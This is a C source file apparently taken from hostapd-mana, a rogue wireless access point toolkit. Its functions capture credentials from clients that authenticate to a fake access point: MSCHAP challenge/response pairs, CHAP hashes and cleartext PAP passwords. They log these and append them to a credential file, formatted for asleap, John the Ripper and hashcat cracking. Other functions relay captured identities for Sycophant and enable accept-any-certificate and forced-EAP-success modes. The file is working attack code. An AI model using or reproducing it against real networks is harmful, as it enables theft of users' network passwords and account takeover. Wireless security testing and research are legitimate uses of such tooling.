/*
 * hostapd-mana EAP/WPE helpers
 */

#include "utils/includes.h"

#include "utils/common.h"
#include "eap_server/eap_i.h"
#include "mana/eap.h"
#include "mana/state.h"

#define MANA_MSCHAP_CHALLENGE_LEN 8

int mana_wpe_enabled(void)
{
	return mana.conf && mana.conf->mana_wpe;
}

int mana_eapsuccess_enabled(void)
{
	return mana.conf && mana.conf->mana_eapsuccess;
}

int mana_eaptls_accept_any_cert(void)
{
	return mana.conf && mana.conf->mana_eaptls;
}

void mana_eap_user_get_identity(struct eap_sm *sm, const u8 **identity,
				size_t *identity_len, int phase2)
{
	if (!mana.conf)
		return;

	if (mana.conf->enable_sycophant &&
	    os_strcmp("NOT_SET", mana.conf->sycophant_dir) != 0) {
		char sup_state[2] = "*";
		FILE *sycophant_state = fopen(mana.conf->sycophant_state_file, "rb");

		if (sycophant_state) {
			fread(sup_state, 1, 1, sycophant_state);
			fclose(sycophant_state);
		}
		if (os_strcmp(sup_state, "I") == 0) {
			const char *id_file = phase2 ? mana.conf->sycophant_id_file[1] :
				mana.conf->sycophant_id_file[0];
			FILE *sycophant_id = fopen(id_file, "wb");

			if (sycophant_id) {
				fwrite(*identity, *identity_len, 1, sycophant_id);
				fclose(sycophant_id);
			} else {
				wpa_printf(MSG_ERROR,
					   "SYCOPHANT: Unable to open Sycophant Stage %d Identity File %s",
					   phase2, id_file);
			}
		}
	}

	if (mana.conf->mana_wpe || mana.conf->enable_sycophant) {
		wpa_printf(MSG_INFO, "MANA EAP Identity Phase %d: %.*s",
			   phase2, (int) *identity_len, *identity);
		if (phase2) {
			static const u8 ident = 't';
			wpa_printf(MSG_DEBUG,
				   "MANA EAP Identiy Phase %d: Setting identity to %c",
				   phase2, ident);
			*identity = &ident;
			*identity_len = 1;
		}
	}

	(void) sm;
}

void eap_server_mschap_rx_callback(struct eap_sm *sm, const char *source,
				   const u8 *username, size_t username_len,
				   const u8 *challenge, const u8 *response)
{
	char hex_sep_challenge[30], hex_sep_response[90], user[100];
	char hex_challenge[30], hex_response[90];

	if (!mana_wpe_enabled())
		return;

	if (username)
		printf_encode(user, sizeof(user), username, username_len);
	else
		user[0] = '\0';
	wpa_snprintf_hex_sep(hex_sep_challenge, sizeof(hex_sep_challenge),
			     challenge, MANA_MSCHAP_CHALLENGE_LEN, ':');
	wpa_snprintf_hex_sep(hex_sep_response, sizeof(hex_sep_response),
			     response, 24, ':');
	wpa_printf(MSG_INFO, "MANA EAP %s ASLEAP user=%s | asleap -C %s -R %s",
		   source, user, hex_sep_challenge, hex_sep_response);
	wpa_snprintf_hex(hex_challenge, sizeof(hex_challenge), challenge,
			 MANA_MSCHAP_CHALLENGE_LEN);
	wpa_snprintf_hex(hex_response, sizeof(hex_response), response, 24);
	wpa_printf(MSG_INFO, "MANA EAP %s JTR | %s:$NETNTLM$%s$%s:::::::",
		   source, user, hex_challenge, hex_response);
	wpa_printf(MSG_INFO, "MANA EAP %s HASHCAT | %s::::%s:%s",
		   source, user, hex_response, hex_challenge);

	if (os_strcmp("NOT_SET", mana.conf->mana_credout) != 0) {
		FILE *f = fopen(mana.conf->mana_credout, "a");

		if (f) {
			fprintf(f, "[%s ASLEAP user=%s]\tasleap -C %s -R %s\n",
				source, user, hex_sep_challenge, hex_sep_response);
			fprintf(f, "[%s JTR]\t%s:$NETNTLM$%s$%s:::::::\n",
				source, user, hex_challenge, hex_response);
			fprintf(f, "[%s HASHCAT]\t%s::::%s:%s\n",
				source, user, hex_response, hex_challenge);
			fclose(f);
		}
	}

	(void) sm;
}

void eap_server_chap_rx_callback(struct eap_sm *sm, const char *source,
				 const u8 *username, size_t username_len,
				 const u8 *hash, const u8 *salt, u8 id)
{
	char hex_hash[40], hex_salt[40], hex_id[10], user[100];

	if (!mana_wpe_enabled())
		return;

	if (username)
		printf_encode(user, sizeof(user), username, username_len);
	else
		user[0] = '\0';
	wpa_snprintf_hex(hex_hash, 34, hash, 16);
	wpa_snprintf_hex(hex_salt, 34, salt, 16);
	wpa_snprintf_hex(hex_id, 3, &id, 1);
	wpa_printf(MSG_INFO, "MANA EAP %s JTR user=%s | $chap$%s*%s*%s",
		   source, user, hex_id, hex_salt, hex_hash);
	wpa_printf(MSG_INFO, "MANA EAP %s HASHCAT user=%s | %s:%s:%s",
		   source, user, hex_hash, hex_salt, hex_id);

	if (os_strcmp("NOT_SET", mana.conf->mana_credout) != 0) {
		FILE *f = fopen(mana.conf->mana_credout, "a");

		if (f) {
			fprintf(f, "[%s JTR user=%s]\t$chap$%s*%s*%s\n",
				source, user, hex_id, hex_salt, hex_hash);
			fprintf(f, "[%s HASHCAT user=%s]\t%s:%s:%s\n",
				source, user, hex_hash, hex_salt, hex_id);
			fclose(f);
		}
	}

	(void) sm;
}

void eap_server_pap_rx_callback(struct eap_sm *sm, const char *source,
				const u8 *username, size_t username_len,
				const u8 *password, size_t password_len)
{
	char passwd[password_len + 1], user[100];

	if (!mana_wpe_enabled())
		return;

	if (username)
		printf_encode(user, sizeof(user), username, username_len);
	else
		user[0] = '\0';
	os_memcpy(passwd, password, password_len);
	passwd[password_len] = '\0';
	wpa_printf(MSG_INFO, "MANA EAP %s | %s:%s", source, user, passwd);

	if (os_strcmp("NOT_SET", mana.conf->mana_credout) != 0) {
		FILE *f = fopen(mana.conf->mana_credout, "a");

		if (f) {
			fprintf(f, "[%s]\t%s:%s\n", source, user, passwd);
			fclose(f);
		}
	}

	(void) sm;
}
